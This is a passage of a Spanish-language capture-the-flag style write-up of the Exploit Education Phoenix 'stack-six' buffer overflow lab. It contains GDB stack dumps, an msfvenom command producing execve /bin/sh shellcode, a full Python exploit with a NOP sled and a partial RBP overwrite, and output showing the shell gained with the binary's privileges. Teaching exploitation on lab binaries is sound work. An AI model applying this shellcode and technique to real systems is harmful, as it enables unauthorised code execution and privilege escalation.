$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe5b0│+0x0000: 0x00007fffffffe628  →  0x00007fffffffe82b  →  "/opt/phoenix/amd64/stack-six"	 ← $rsp
0x00007fffffffe5b8│+0x0008: 0x00000001ffffe638
0x00007fffffffe5c0│+0x0010: 0x000000000040079b  →  <main+0> push rbp
0x00007fffffffe5c8│+0x0018: 0x00007fffffffef10  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe5d0│+0x0020: 0x0000000000000001
0x00007fffffffe5d8│+0x0028: 0x00007ffff7d8fd62  →  <__libc_start_main+54> mov edi, eax
0x00007fffffffe5e0│+0x0030: 0x0000000000000000
0x00007fffffffe5e8│+0x0038: 0x00007fffffffe620  →  0x0000000000000001
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007e9 <main+78>        mov    rdi, rax
     0x4007ec <main+81>        call   0x400530 <puts@plt>
     0x4007f1 <main+86>        mov    eax, 0x0
 →   0x4007f6 <main+91>        leave  
     0x4007f7 <main+92>        ret    
     0x4007f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400800 <__do_global_ctors_aux+0> mov    rax, QWORD PTR [rip+0x2001c9]        # 0x6009d0
     0x400807 <__do_global_ctors_aux+7> cmp    rax, 0xffffffffffffffff
     0x40080b <__do_global_ctors_aux+11> je     0x400840 <__do_global_ctors_aux+64>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-six", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007f6 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

En este punto inspeccionamos la pila con `x/50xg $rsp` y confirmamos que:

- En la posición `0x7fffffffe5c0` se encuentra la **dirección de retorno a `main+0`** (`0x40079b`).
- Justo después, en `0x7fffffffe5b8`, aparece el **puntero a nuestro payload** (`0x7fffffffef10`), que apunta directamente a la cadena de `'A'` inyectada desde la variable de entorno `ExploitEducation`.

Esto confirma que:

1. **El payload ya tiene una referencia en el stack** → el programa guarda un puntero que apunta a los datos que controlamos.
2. Si logramos sobrescribir el **saved RIP** con esta dirección (`0x7fffffffef10`), podremos redirigir el flujo de ejecución hacia el buffer y ejecutar el shellcode contenido ahí.
3. Se valida que el **ret2payload es posible**, dado que tenemos tanto la dirección base del payload como un puntero confiable a él en el stack.

```csharp
gef➤  x/50xg $rsp
0x7fffffffe5b0:	0x00007fffffffe628	0x00000001ffffe638
0x7fffffffe5c0:	0x000000000040079b	0x00007fffffffef10
0x7fffffffe5d0:	0x0000000000000001	0x00007ffff7d8fd62
0x7fffffffe5e0:	0x0000000000000000	0x00007fffffffe620
0x7fffffffe5f0:	0x0000000000000000	0x00007ffff7ffdbc8
0x7fffffffe600:	0x0400000100003e00	0x00000000004005c9
0x7fffffffe610:	0x0000000000000000	0x00000000004005a6
0x7fffffffe620:	0x0000000000000001	0x00007fffffffe82b
0x7fffffffe630:	0x0000000000000000	0x00007fffffffe848
0x7fffffffe640:	0x00007fffffffee04	0x00007fffffffee2f
0x7fffffffe650:	0x00007fffffffee44	0x00007fffffffee51
0x7fffffffe660:	0x00007fffffffee5b	0x00007fffffffee6a
0x7fffffffe670:	0x00007fffffffee73	0x00007fffffffee83
0x7fffffffe680:	0x00007fffffffeea0	0x00007fffffffeeb3
0x7fffffffe690:	0x00007fffffffeebf	0x00007fffffffeed3
0x7fffffffe6a0:	0x00007fffffffeee3	0x00007fffffffeef7
0x7fffffffe6b0:	0x00007fffffffeeff	0x00007fffffffef90
0x7fffffffe6c0:	0x00007fffffffef9d	0x0000000000000000
0x7fffffffe6d0:	0x0000000000000021	0x00007ffff7ff8000
0x7fffffffe6e0:	0x0000000000000010	0x00000000078bfbfd
0x7fffffffe6f0:	0x0000000000000006	0x0000000000001000
0x7fffffffe700:	0x0000000000000011	0x0000000000000064
0x7fffffffe710:	0x0000000000000003	0x0000000000400040
0x7fffffffe720:	0x0000000000000004	0x0000000000000038
0x7fffffffe730:	0x0000000000000005	0x0000000000000007
gef➤
```

Se verifica la **posición exacta del puntero al payload** en la pila. Con `find /g` se busca la dirección `0x7fffffffef10` (inicio de los `'A'` en el entorno) en el rango cercano a `$rsp`, y se obtiene **`0x7fffffffe5c8`**. Esto nos da un **ancla fiable en el stack** para calcular offsets y preparar el exploit, asegurando que el **saved RIP** pueda reescribirse para saltar correctamente al payload.

```csharp
gef➤  find /g $rsp-0x2000, $rsp+0x800, 0x7fffffffef10
0x7fffffffe5c8
1 pattern found.
gef➤ 
```

La pila ahora contiene, en `0x7fffffffe5b8`, el puntero a nuestro payload (`0x7fffffffef10`) y, justo antes, en `0x7fffffffe5b0`, el **saved RIP** (la dirección a la que `ret` saltará). Al ejecutar `leave` el procesador hace `mov rsp, rbp` (ajusta `rsp` al base pointer del frame) y `pop rbp` (restaura el `rbp` previo, que puede haber quedado parcialmente corrompido). A continuación `ret` realiza un `pop rip`: toma el valor en la cima de la pila (ahora `saved RIP` en `0x7fffffffe5b0`) y lo carga en `rip`, transfiriendo la ejecución a esa dirección. Por eso, si sobrescribimos `saved RIP` con `0x7fffffffef10`, el `ret` saltará directamente al payload en la pila y controlaremos el flujo del programa.

```csharp
0x7fffffffe5c8 − 8 = 0x7fffffffe5c0
```

Con esto ya estamos listos para generar el exploit que nos dará una shell.

El primer paso es crear el **shellcode**. Para este caso utilicé **msfvenom**, especificando la arquitectura `x64`, la plataforma Linux y el comando que quiero ejecutar (`/bin/sh`). Además, filtré el carácter nulo (`\x00`) para evitar problemas en la inyección:

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody]
└─# msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x00' -f python --var-name shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 87 (iteration=0)
x64/xor chosen with final size 87
Payload size: 87 bytes
Final size of python file: 501 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xf5\xd5\x32"
shellcode += b"\x6f\x45\xfe\x97\x0f\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xbd\x6d\x1d\x0d\x2c"
shellcode += b"\x90\xb8\x7c\x9d\xd5\xab\x3f\x11\xa1\xc5\x69"
shellcode += b"\x9d\xf8\x51\x3b\x1b\xac\x7f\x07\xf5\xd5\x32"
shellcode += b"\x40\x27\x97\xf9\x20\x86\xbd\x32\x39\x12\xaa"
shellcode += b"\xc9\x65\xce\x8d\x3d\x6a\x45\xfe\x97\x0f"
```

Con el shellcode ya preparado, el siguiente paso fue armar el exploit en Python para inyectarlo en el binario vulnerable.

Primero, definí el **offset** necesario para alcanzar la dirección de retorno. En este caso son **127 bytes**.

Después, incluí el **shellcode generado con msfvenom** y definí el último byte de la dirección de retorno (`lsb`) que sobreescribirá el flujo del programa.

Luego lo que hacemos es **rellenar con instrucciones NOP (`0x90`) hasta alcanzar el offset exacto**. Esto se conoce como un **NOP sled**, y es especialmente útil en retos como

con esto aseguramos que:

- Aunque la dirección de retorno no apunte exactamente al inicio del shellcode, al caer en cualquier parte de esta zona de NOPs, la ejecución "resbale" hasta alcanzar el shellcode real.
- Así conseguimos que la explotación ya que no necesitamos acertar a una dirección precisa, solo apuntar a un rango dentro del sled.

```csharp
user@phoenix-amd64:/tmp$ nano Local_exploit.py 
user@phoenix-amd64:/tmp$ cat Local_exploit.py 
#!/usr/bin/env python3

# Total de bytes hasta la dirección de retorno
offset = 127

# Shellcode generado previamente
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x1b\x26\x05"
shellcode += b"\x07\x09\xc0\x8c\xbf\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x53\x9e\x2a\x65\x60"
shellcode += b"\xae\xa3\xcc\x73\x26\x9c\x57\x5d\x9f\xde\xd9"
shellcode += b"\x73\x0b\x66\x53\x57\x92\x64\xb7\x1b\x26\x05"
shellcode += b"\x28\x6b\xa9\xe2\x90\x68\x4e\x05\x51\x5e\x94"
shellcode += b"\xd2\xd5\x20\x7e\x0a\x02\x09\xc0\x8c\xbf"

# Último byte de la dirección de retorno 
lsb = b'\xc0'

# Construcción del payload: shellcode + NOP sled + dirección de retorno
buf  = shellcode
buf += b'\x90' * (offset - len(shellcode))
buf += lsb

# Imprimir el payload en stdout para redirigirlo al binario vulnerable
import sys
sys.stdout.buffer.write(buf)

```

Si vemos una grafica de la pila, esto es lo que realizará nuestro payload.

```csharp
Direcciones (más altas)
┌─────────────────────────────┐
│ Saved RIP                   │  <- dirección de retorno sobrescrita
│                                con valor parcial (LSB)
├─────────────────────────────┤
│ Saved RBP                   │  <- 0x7fffffffe5c0
│ (último byte sobrescrito)   │  <- 161 bytes pisan solo 1 byte de RBP
├─────────────────────────────┤
│ NOP sled (~39 bytes)        │  <- b'\x90' * (offset - len(shellcode))
│                                "zona de aterrizaje" para llegar al shellcode
├─────────────────────────────┤
│ Shellcode (87 bytes)        │  <- generado con msfvenom (execve /bin/sh)
│                                se ejecuta al caer en la NOP sled
├─────────────────────────────┤
│ Entrada controlada (127 B)  │  <- payload del exploit
│   - Shellcode (87 B)        │
│   - NOP sled (~39 B)        │
│   - +1 byte → pisa RBP (LSB)│
├─────────────────────────────┤
│ Buffer local (128 bytes)    │  <- reservado por el programa (rbp-0xa0 → rbp-0x1)
│   - "Welcome, I am pleased…"│  (34 bytes de mensaje fijo del binario)
│   - Resto → ocupado por     │
│     nuestra entrada control │
└─────────────────────────────┘
Direcciones (más bajas)Direcciones (más altas)
┌─────────────────────────────┐
│ Saved RIP (0x4007e9)        │  <- dirección de retorno de greet() hacia main()
├─────────────────────────────┤
│ Saved RBP                   │  <- 0x7fffffffe5c0
│ (LSB sobrescrito: 1 byte)   │  <- desbordamiento de 161 bytes pisa solo 1 byte
├─────────────────────────────┤
│ Buffer local (128 bytes)    │  <- rbp-0xa0 → rbp-0x1
│   - "Welcome, I am pleased…"│  (34 bytes del mensaje fijo)
│   - + 127 'A' de la variable│  (entrada controlada)
└─────────────────────────────┘
Direcciones (más bajas)
```

Con el exploit ya preparado, el siguiente paso fue cargar nuestro payload en una variable de entorno para que el binario vulnerable lo reciba como entrada.

Para ello, simplemente exportamos la salida del script en la variable

**ExploitEducation**

```csharp
user@phoenix-amd64:~$ export ExploitEducation=$(python3 /tmp/Local_exploit.py)
```

Con la variable de entorno ya configurada con nuestro payload, ejecutamos el binario vulnerable bajo **GDB** para observar el comportamiento del exploit  y podemos ver que el programa se desbordó y ejecuta nuestra shell

- El flujo de ejecución fue redirigido al **NOP sled**, que nos llevó a ejecutar el **shellcode**.
- El shellcode abrió un nuevo **/bin/dash**, otorgándonos una **shell interactiva** bajo el contexto del usuario actual.

```csharp
user@phoenix-amd64:~$ gdb -q /opt/phoenix/amd64/stack-six 
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/amd64/stack-six...(no debugging symbols found)...done.
gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you H1�H������H�����H�	��H1X'H-������S�*e`���s&�W]���s
                                                                                       fSW�d���hNQ^��� ~
	�����������������������������������������������
process 501 is executing new program: /bin/dash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?
[Detaching after fork from child process 505]
$ whoami
user
$
```

Finalmente, ejecutamos directamente el binario vulnerable con nuestro payload cargado en la variable de entorno:

```csharp
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you H1�H������H�����H�	��H1X'H-������S�*e`���s&�W]���s
                                                                                       fSW�d���hNQ^��� ~
	�����������������������������������������������
$ id 
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(phoenix-amd64-stack-six) groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
$ 
```

### Conclusión

En **Stack Six** dimos un paso más allá en la explotación de desbordamientos de buffer: además de inyectar un **shellcode propio**, tuvimos que gestionar un **payload más grande** y afinar el control sobre la pila modificando únicamente el **LSB del saved RBP** para redirigir la ejecución.

**Puntos clave:**

- El binario vulnerable vuelve a usar funciones inseguras como `gets()`, lo que nos permite un desbordamiento.

- El **offset de 127 bytes** nos dio la distancia exacta para llegar a la dirección de retorno, lo que facilitó el control del flujo del programa.

- Al payload le añadimos un **NOP sled** que actúa como “zona de aterrizaje”, aumentando la tolerancia al redireccionamiento hacia nuestro shellcode.

- El **shellcode generado con msfvenom** nos permitió ejecutar `/bin/sh`, abriendo una shell con los privilegios del binario.

- La explotación se completó inyectando todo en la variable de entorno y verificando la ejecución tanto en GDB como directamente en el sistema.